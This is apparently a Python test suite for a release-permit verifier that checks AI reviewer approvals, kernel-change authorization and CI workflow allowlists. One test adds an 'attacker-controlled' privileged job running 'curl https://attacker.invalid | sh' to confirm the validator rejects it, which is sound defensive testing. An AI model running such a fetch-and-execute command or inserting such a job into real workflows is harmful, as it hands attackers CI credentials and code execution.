from __future__ import annotations

import argparse
import hashlib
import importlib.util
import json
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest
from unittest import mock


ROOT = Path(__file__).resolve().parents[1]
MODULE_PATH = ROOT / "scripts" / "verify_authority_promotion.py"
SPEC = importlib.util.spec_from_file_location("verify_authority_promotion", MODULE_PATH)
if SPEC is None or SPEC.loader is None:
    raise RuntimeError(f"unable to load {MODULE_PATH}")
MODULE = importlib.util.module_from_spec(SPEC)
sys.path.insert(0, str(ROOT / "scripts"))
SPEC.loader.exec_module(MODULE)
PERMIT_MODULE = sys.modules["autonomous_release_permit"]

PARENT_SHA = "1" * 40
PARENT_KERNEL_SHA = "2" * 40
CANDIDATE_KERNEL_SHA = PARENT_KERNEL_SHA
CONTEXT_SHA = "4" * 64
RESPONSE_A = "5" * 64
RESPONSE_B = "6" * 64


def allowed_workflow() -> str:
    return MODULE.WORKFLOW_TEMPLATE_PATH.read_text(encoding="utf-8").replace(
        MODULE.WORKFLOW_TEMPLATE_MARKER,
        CANDIDATE_KERNEL_SHA,
    )


def git(repository: Path, *arguments: str) -> str:
    return subprocess.check_output(
        ["git", "-C", str(repository), *arguments],
        text=True,
    ).strip()


def build_candidate(root: Path) -> tuple[Path, str, str]:
    repository = root / "candidate"
    (repository / "config").mkdir(parents=True)
    (repository / "tests" / "fixtures").mkdir(parents=True)
    (repository / ".github" / "workflows").mkdir(parents=True)
    gates = b'{"profiles":{}}\n'
    corpus = b'{"schema":"mindburn.release-permit-adversarial/v1","cases":[]}\n'
    (repository / "config" / "autonomous-release-gates.json").write_bytes(gates)
    (
        repository / "tests" / "fixtures" / "autonomous-release-adversarial.json"
    ).write_bytes(corpus)
    authority = {
        "schema": "mindburn.release-authority/v1",
        "generation": 2,
        "kernel_sha": CANDIDATE_KERNEL_SHA,
        "gate_profiles_sha256": hashlib.sha256(gates).hexdigest(),
        "adversarial_corpus_sha256": hashlib.sha256(corpus).hexdigest(),
        "parent": {"generation": 1, "workflow_sha": PARENT_SHA},
    }
    (repository / "config" / "autonomous-release-authority.json").write_text(
        json.dumps(authority, indent=2) + "\n",
        encoding="utf-8",
    )
    (repository / ".github" / "workflows" / "ci.yml").write_text(
        allowed_workflow(),
        encoding="utf-8",
    )
    subprocess.run(["git", "-C", str(repository), "init", "-b", "main"], check=True)
    subprocess.run(
        ["git", "-C", str(repository), "config", "user.name", "Permit Test"], check=True
    )
    subprocess.run(
        ["git", "-C", str(repository), "config", "user.email", "permit@example.test"],
        check=True,
    )
    subprocess.run(["git", "-C", str(repository), "add", "-A"], check=True)
    subprocess.run(
        ["git", "-C", str(repository), "commit", "-m", "candidate"], check=True
    )
    candidate_sha = git(repository, "rev-parse", "HEAD")
    return repository, candidate_sha, git(repository, "rev-parse", "HEAD^{tree}")


def build_permit(candidate_sha: str, candidate_tree: str) -> dict[str, object]:
    permit: dict[str, object] = {
        "schema": "mindburn.release-permit/v2",
        "permit_id": "",
        "decision": "ALLOW",
        "repository": "Mindburn-Labs/.github",
        "pull_request": 33,
        "base_ref": "refs/heads/main",
        "base_sha": "7" * 40,
        "head_sha": candidate_sha,
        "merge_sha": "8" * 40,
        "merge_tree_sha": candidate_tree,
        "workflow_repository": "Mindburn-Labs/.github",
        "workflow_path": ".github/workflows/ci.yml",
        "workflow_ref": "Mindburn-Labs/.github/.github/workflows/ci.yml@refs/heads/main",
        "workflow_sha": PARENT_SHA,
        "run_id": 101,
        "run_attempt": 1,
        "issued_at": "2026-07-14T10:00:00Z",
        "authority": {
            "schema": "mindburn.release-authority/v1",
            "generation": 1,
            "kernel_sha": PARENT_KERNEL_SHA,
            "gate_profiles_sha256": "9" * 64,
            "adversarial_corpus_sha256": "a" * 64,
            "parent": None,
        },
        "context_sha256": CONTEXT_SHA,
        "reviews": [
            {
                "reviewer": {"provider": "anthropic", "model": "claude-fable-5"},
                "verdict": "ALLOW",
                "response_sha256": RESPONSE_A,
                "blocking_findings": 0,
                "advisory_findings": 0,
            },
            {
                "reviewer": {"provider": "openai", "model": "gpt-5.6-sol"},
                "verdict": "ALLOW",
                "response_sha256": RESPONSE_B,
                "blocking_findings": 0,
                "advisory_findings": 1,
            },
        ],
        "reasons": [],
    }
    permit["permit_id"] = "sha256:" + "b" * 64
    return permit


def build_fake_verifier(root: Path, *, succeeds: bool = True) -> Path:
    verifier = root / "release-permit-verify"
    body = """#!/bin/sh
set -eu
if [ "${1:-}" = "--verify-permit" ]; then
  exit 0
fi
output=
while [ "$#" -gt 0 ]; do
  if [ "$1" = "--output" ]; then
    shift
    output=$1
  fi
  shift
done
test -n "$output"
cp "$(dirname "$0")/permit.json" "$output"
"""
    verifier.write_text(
        body if succeeds else "#!/bin/sh\necho rejected >&2\nexit 2\n",
        encoding="utf-8",
    )
    verifier.chmod(0o700)
    return verifier


def verify_args(
    repository: Path,
    candidate_sha: str,
    permit_path: Path,
    verifier: Path,
) -> argparse.Namespace:
    permit = json.loads(permit_path.read_text(encoding="utf-8"))
    trusted_context = permit_path.parent / "context.json"
    trusted_context.write_text(
        json.dumps(
            {
                "schema": PERMIT_MODULE.CONTEXT_SCHEMA,
                "repository": permit["repository"],
                "pull_request": permit["pull_request"],
                "base_sha": permit["base_sha"],
                "head_sha": permit["head_sha"],
                "merge_sha": permit["merge_sha"],
                "merge_tree_sha": permit["merge_tree_sha"],
                "workflow_sha": permit["workflow_sha"],
                "run_id": permit["run_id"],
                "run_attempt": permit["run_attempt"],
                "required_reviewers": [
                    {"provider": provider, "model": model}
                    for provider, model in MODULE.MODEL_REVIEWERS.items()
                ],
            },
            indent=2,
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )
    review_evidence = permit_path.parent / "review-evidence"
    review_evidence.mkdir()
    for provider, model in MODULE.MODEL_REVIEWERS.items():
        raw = review_evidence / f"raw-{provider}.txt"
        raw.write_text(
            json.dumps(
                {
                    "type": "assistant.message",
                    "data": {
                        "toolRequests": [],
                        "content": '{"verdict":"ALLOW","findings":[]}',
                    },
                },
                separators=(",", ":"),
            )
            + "\n"
            + json.dumps({"type": "result", "exitCode": 0}, separators=(",", ":"))
            + "\n",
            encoding="utf-8",
        )
        normalized = review_evidence / f"normalized-{provider}.json"
        PERMIT_MODULE.normalize_model_output(
            argparse.Namespace(
                raw=raw,
                output=normalized,
                transport_format="copilot-jsonl",
                max_transport_bytes=16_777_216,
                max_response_bytes=1_048_576,
            )
        )
        PERMIT_MODULE.envelope(
            argparse.Namespace(
                context=trusted_context,
                raw=normalized,
                provider=provider,
                model=model,
                output=review_evidence / f"review-{provider}.json",
                max_response_bytes=1_048_576,
            )
        )
    return argparse.Namespace(
        permit=permit_path,
        permit_verifier=verifier,
        trusted_context=trusted_context,
        review_evidence_dir=review_evidence,
        recomputed_permit=permit_path.parent / "parent-recomputed-permit.json",
        candidate_repository=repository,
        candidate_sha=candidate_sha,
        candidate_pr=33,
        expected_run_id=101,
        expected_run_attempt=1,
        expected_parent_generation=1,
        expected_parent_workflow_sha=PARENT_SHA,
        output=None,
    )


class AuthorityPromotionTests(unittest.TestCase):
    def test_candidate_cannot_self_authorize_a_kernel_change(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            root = Path(tmpdir)
            repository, candidate_sha, candidate_tree = build_candidate(root)
            authority_path = repository / "config" / "autonomous-release-authority.json"
            authority = json.loads(authority_path.read_text(encoding="utf-8"))
            authority["kernel_sha"] = "3" * 40
            authority_path.write_text(json.dumps(authority) + "\n", encoding="utf-8")
            subprocess.run(["git", "-C", str(repository), "add", "-A"], check=True)
            subprocess.run(
                ["git", "-C", str(repository), "commit", "-m", "change kernel"],
                check=True,
            )
            candidate_sha = git(repository, "rev-parse", "HEAD")
            candidate_tree = git(repository, "rev-parse", "HEAD^{tree}")
            permit_path = root / "permit.json"
            permit_path.write_text(
                json.dumps(build_permit(candidate_sha, candidate_tree)) + "\n",
                encoding="utf-8",
            )
            with self.assertRaisesRegex(
                MODULE.PermitInputError,
                "Kernel-upgrade protocol",
            ):
                MODULE.verify(
                    verify_args(
                        repository,
                        candidate_sha,
                        permit_path,
                        build_fake_verifier(root),
                    ),
                )

    def test_parent_owned_workflow_template_accepts_only_exact_semantics(self) -> None:
        MODULE.validate_candidate_workflow(
            allowed_workflow(),
            kernel_sha=CANDIDATE_KERNEL_SHA,
        )

    def test_extra_privileged_job_fails_closed(self) -> None:
        workflow = (
            allowed_workflow()
            + """
  attacker-controlled:
    permissions:
      contents: write
      id-token: write
    runs-on: ubuntu-latest
    steps:
      - run: curl https://attacker.invalid | sh
"""
        )
        with self.assertRaisesRegex(
            MODULE.PermitInputError,
            "parent-owned complete allowlist",
        ):
            MODULE.validate_candidate_workflow(
                workflow,
                kernel_sha=CANDIDATE_KERNEL_SHA,
            )

    def test_trigger_permission_and_action_input_mutations_fail_closed(self) -> None:
        mutations = (
            allowed_workflow().replace(
                "permissions: {}",
                "permissions:\n  contents: write",
                1,
            ),
            allowed_workflow().replace(
                "persist-credentials: false",
                "persist-credentials: true",
                1,
            ),
            allowed_workflow().replace(
                "  push:\n    branches:\n      - main",
                "  workflow_dispatch:",
                1,
            ),
        )
        for workflow in mutations:
            with (
                self.subTest(sha=hashlib.sha256(workflow.encode()).hexdigest()),
                self.assertRaisesRegex(
                    MODULE.PermitInputError,
                    "parent-owned complete allowlist",
                ),
            ):
                MODULE.validate_candidate_workflow(
                    workflow,
                    kernel_sha=CANDIDATE_KERNEL_SHA,
                )

    def test_kernel_verifier_does_not_inherit_authority_tokens(self) -> None:
        completed = mock.Mock(returncode=0, stderr=b"")
        with (
            mock.patch.dict(
                MODULE.os.environ,
                {
                    "GH_TOKEN": "executor-secret",
                    "HELM_AUTHORITY_APPROVER_TOKEN": "approver-secret",
                },
            ),
            mock.patch.object(
                MODULE.subprocess,
                "run",
                return_value=completed,
            ) as run,
        ):
            MODULE.verify_permit_with_kernel(
                Path("release-permit-verify"),
                Path("permit.json"),
                Path("context.json"),
            )
        self.assertNotIn("GH_TOKEN", run.call_args.kwargs["env"])
        self.assertNotIn(
            "HELM_AUTHORITY_APPROVER_TOKEN",
            run.call_args.kwargs["env"],
        )

    def test_previous_generation_permit_ratifies_exact_successor(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            root = Path(tmpdir)
            repository, candidate_sha, candidate_tree = build_candidate(root)
            permit_path = root / "permit.json"
            permit_path.write_text(
                json.dumps(build_permit(candidate_sha, candidate_tree), indent=2)
                + "\n",
                encoding="utf-8",
            )
            result = MODULE.verify(
                verify_args(
                    repository, candidate_sha, permit_path, build_fake_verifier(root)
                ),
            )
        self.assertEqual(result["candidate_generation"], 2)
        self.assertEqual(result["parent_workflow_sha"], PARENT_SHA)

    def test_tree_or_permit_substitution_fails_closed(self) -> None:
        for mutation, message in (
            ("tree", "merge tree"),
            ("permit", "permit_id"),
        ):
            with (
                self.subTest(mutation=mutation),
                tempfile.TemporaryDirectory() as tmpdir,
            ):
                root = Path(tmpdir)
                repository, candidate_sha, candidate_tree = build_candidate(root)
                permit = build_permit(candidate_sha, candidate_tree)
                if mutation == "tree":
                    permit["merge_tree_sha"] = "b" * 40
                else:
                    permit["permit_id"] = "invalid"
                permit_path = root / "permit.json"
                permit_path.write_text(json.dumps(permit) + "\n", encoding="utf-8")
                with self.assertRaisesRegex(MODULE.PermitInputError, message):
                    MODULE.verify(
                        verify_args(
                            repository,
                            candidate_sha,
                            permit_path,
                            build_fake_verifier(root),
                        ),
                    )

    def test_kernel_rejection_fails_closed(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            root = Path(tmpdir)
            repository, candidate_sha, candidate_tree = build_candidate(root)
            permit_path = root / "permit.json"
            permit_path.write_text(
                json.dumps(build_permit(candidate_sha, candidate_tree)) + "\n",
                encoding="utf-8",
            )
            with self.assertRaisesRegex(
                MODULE.PermitInputError, "pinned Kernel rejected"
            ):
                MODULE.verify(
                    verify_args(
                        repository,
                        candidate_sha,
                        permit_path,
                        build_fake_verifier(root, succeeds=False),
                    ),
                )


if __name__ == "__main__":
    unittest.main()
